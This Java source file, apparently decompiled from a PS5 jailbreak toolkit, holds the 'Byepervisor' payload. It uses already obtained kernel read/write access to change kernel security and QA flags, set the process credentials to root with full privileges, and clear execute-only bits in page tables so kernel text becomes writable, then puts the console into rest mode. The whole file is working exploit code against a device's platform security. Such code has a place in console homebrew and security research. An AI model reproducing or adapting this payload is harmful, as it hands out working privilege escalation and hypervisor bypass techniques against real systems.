package org.ps5jb.client.payloads;

import org.ps5jb.sdk.core.Pointer;
import org.ps5jb.sdk.core.SdkRuntimeException;
import org.ps5jb.sdk.include.sys.errno.MemoryFaultException;
import org.ps5jb.sdk.include.machine.pmap.PageMapEntryMask;
import org.ps5jb.sdk.include.machine.pmap.PageMap;
import org.ps5jb.sdk.include.sys.proc.Process;
import org.ps5jb.sdk.include.machine.PMap;
import org.ps5jb.loader.Status;
import org.ps5jb.loader.KernelReadWrite;
import org.ps5jb.sdk.core.kernel.KernelOffsets;
import org.ps5jb.sdk.core.kernel.KernelPointer;
import org.ps5jb.sdk.lib.LibKernel;

public class Byepervisor implements Runnable
{
    private static final long OFFSET_PMAP_STORE_PML4PML4I = -28L;
    private static final long OFFSET_PMAP_STORE_DMPML4I = 648L;
    private static final long OFFSET_PMAP_STORE_DMPDPI = 652L;
    private LibKernel libKernel;
    private KernelPointer kbaseAddress;
    private KernelOffsets offsets;
    
    public void run() {
        if (KernelReadWrite.getAccessor() == null) {
            Status.println("Unable to execute Byepervisor without kernel read/write capabilities");
            return;
        }
        this.libKernel = new LibKernel();
        try {
            final int fw = this.libKernel.getSystemSoftwareVersion();
            if (fw >= 768) {
                Status.println("Unable to execute Byepervisor on firmware version: " + (fw >> 8 & 0xFF) + "." + (((fw & 0xFF) < 10) ? "0" : "") + (fw & 0xFF));
                return;
            }
            this.kbaseAddress = KernelPointer.valueOf(KernelReadWrite.getAccessor().getKernelBase());
            if (KernelPointer.NULL.equals(this.kbaseAddress)) {
                Status.println("Kernel base address has not been determined. Aborting.");
                return;
            }
            this.offsets = new KernelOffsets(fw);
            final Process curProc = this.getCurrentProc();
            if (curProc == null) {
                Status.println("Current process could not be found. Aborting.");
                return;
            }
            final boolean alreadyApplied = this.checkRwFlag(false);
            final KernelPointer securityFlagsAddress = this.kbaseAddress.inc(this.offsets.OFFSET_KERNEL_DATA + this.offsets.OFFSET_KERNEL_DATA_BASE_SECURITY_FLAGS);
            final int origSecurityFlags = securityFlagsAddress.read4();
            final int newSecurityFlags = alreadyApplied ? 3 : (origSecurityFlags | 0x14);
            Status.println("Security flags: 0x" + Integer.toHexString(origSecurityFlags) + " => 0x" + Integer.toHexString(newSecurityFlags));
            securityFlagsAddress.write4(newSecurityFlags);
            final KernelPointer qaFlagsAddress = this.kbaseAddress.inc(this.offsets.OFFSET_KERNEL_DATA + this.offsets.OFFSET_KERNEL_DATA_BASE_QA_FLAGS);
            final int origQaFlags = qaFlagsAddress.read4();
            final int newQaFlags = alreadyApplied ? 0 : (origQaFlags | 0x10300);
            Status.println("QA flags: 0x" + Integer.toHexString(origQaFlags) + " => 0x" + Integer.toHexString(newQaFlags));
            qaFlagsAddress.write4(newQaFlags);
            if (alreadyApplied) {
                Status.println("Kernel base address is already readable. Aborting.");
                return;
            }
            final int[] origIds = this.setUserGroup(curProc, new int[] { 0, 0, 0, 1, 0 });
            final long[] origPrivs = this.setPrivs(curProc, new long[] { 5188146770730811399L, -1L, -1L, 128L });
            final KernelPointer pmap = this.kbaseAddress.inc(this.offsets.OFFSET_KERNEL_DATA + this.offsets.OFFSET_KERNEL_DATA_BASE_KERNEL_PMAP_STORE);
            PMap.refresh(pmap.inc(648L), pmap.inc(652L), pmap.inc(-28L));
            Status.println("Enabling kernel text read/write...");
            this.enableKernelTextWrite();
            this.setUserGroup(curProc, origIds);
            this.setPrivs(curProc, origPrivs);
            this.checkRwFlag(true);
            Status.println("The process will now exit and the system will be put in rest mode shortly after.");
            Status.println("If this does not happen automatically, manually put the system to sleep.");
            Status.println("Upon resume, kernel text will be accessible after re-running the kernel read/write payload.");
            try {
                Thread.sleep(2000L);
            }
            catch (final InterruptedException ex) {}
            this.enterRestMode();
        }
        finally {
            this.libKernel.closeLibrary();
        }
    }
    
    private Process getCurrentProc() {
        final int curPid = this.libKernel.getpid();
        final KernelPointer kdataAddress = this.kbaseAddress.inc(this.offsets.OFFSET_KERNEL_DATA);
        final KernelPointer allproc = kdataAddress.inc(this.offsets.OFFSET_KERNEL_DATA_BASE_ALLPROC);
        Process curProc;
        for (curProc = new Process(KernelPointer.valueOf(allproc.read8())); curProc != null; curProc = curProc.getNextProcess()) {
            final int pid = this.libKernel.getpid();
            if (pid == curPid) {
                break;
            }
        }
        return curProc;
    }
    
    private int[] setUserGroup(final Process proc, final int[] ids) {
        final KernelPointer ucredAddr = proc.getUCred();
        final int[] result = { ucredAddr.read4(4L), ucredAddr.read4(8L), ucredAddr.read4(12L), ucredAddr.read4(16L), ucredAddr.read4(20L) };
        ucredAddr.write4(4L, ids[0]);
        ucredAddr.write4(8L, ids[1]);
        ucredAddr.write4(12L, ids[2]);
        ucredAddr.write4(16L, ids[3]);
        ucredAddr.write4(20L, ids[4]);
        return result;
    }
    
    private long[] setPrivs(final Process proc, final long[] privs) {
        final KernelPointer ucredAddr = proc.getUCred();
        final long[] result = { ucredAddr.read8(88L), ucredAddr.read8(96L), ucredAddr.read8(104L), ucredAddr.read1(131L) };
        ucredAddr.write8(88L, privs[0]);
        ucredAddr.write8(96L, privs[1]);
        ucredAddr.write8(104L, privs[2]);
        ucredAddr.write1(131L, (byte)privs[3]);
        return result;
    }
    
    private void enableKernelTextWrite() {
        final KernelPointer kdataAddress = this.kbaseAddress.inc(this.offsets.OFFSET_KERNEL_DATA);
        final PageMap pageMap = new PageMap(kdataAddress.inc(this.offsets.OFFSET_KERNEL_DATA_BASE_KERNEL_PMAP_STORE));
        long pageCount = 0L;
        final long totalPageCount = (kdataAddress.addr() - this.kbaseAddress.addr()) / 4096L;
        for (long addr = this.kbaseAddress.addr(); addr < kdataAddress.addr(); addr += 4096L) {
            final KernelPointer pdeAddress = PMap.pmap_pde(pageMap, addr);
            this.patchPageMapEntry(pdeAddress);
            final KernelPointer pteAddress = PMap.pmap_pte(pageMap, addr);
            this.patchPageMapEntry(pteAddress);
            ++pageCount;
            if (pageCount % 256L == 0L) {
                Status.println("Processed 0x" + Long.toHexString(pageCount) + " / 0x" + Long.toHexString(totalPageCount) + " pages");
            }
        }
    }
    
    private void patchPageMapEntry(final KernelPointer dmapPtr) {
        if (!KernelPointer.NULL.equals(dmapPtr)) {
            try {
                final long value = dmapPtr.read8();
                long newValue = this.clearPageMapEntry(value, PageMapEntryMask.SCE_PG_XO);
                newValue = this.setPageMapEntry(newValue, PageMapEntryMask.X86_PG_RW);
                if (value != newValue) {
                    dmapPtr.write8(newValue);
                }
            }
            catch (final SdkRuntimeException e) {
                if (!(e.getCause() instanceof MemoryFaultException)) {
                    throw e;
                }
            }
        }
    }
    
    private long clearPageMapEntry(final long value, final PageMapEntryMask mask) {
        return value & ~mask.value();
    }
    
    private long setPageMapEntry(final long value, final PageMapEntryMask mask) {
        return value | mask.value();
    }
    
    private boolean checkRwFlag(final boolean flip) {
        final KernelPointer kdataAddress = this.kbaseAddress.inc(this.offsets.OFFSET_KERNEL_DATA);
        final boolean result = kdataAddress.read4(this.offsets.OFFSET_KERNEL_DATA_BASE_DATA_CAVE) == 4919;
        if (!result && flip) {
            kdataAddress.write8(this.offsets.OFFSET_KERNEL_DATA_BASE_DATA_CAVE, -4827858800541166793L);
        }
        return result;
    }
    
    private void enterRestMode() {
        final Pointer eventFlag = Pointer.calloc(8L);
        try {
            if (this.libKernel.sceKernelOpenEventFlag(eventFlag, "SceSystemStateMgrStatus") == 0) {
                this.libKernel.sceKernelNotifySystemSuspendStart();
                this.libKernel.sceKernelSetEventFlag(eventFlag.read8(), 1024);
                this.libKernel.sceKernelCloseEventFlag(eventFlag);
            }
        }
        finally {
            eventFlag.free();
        }
    }
}
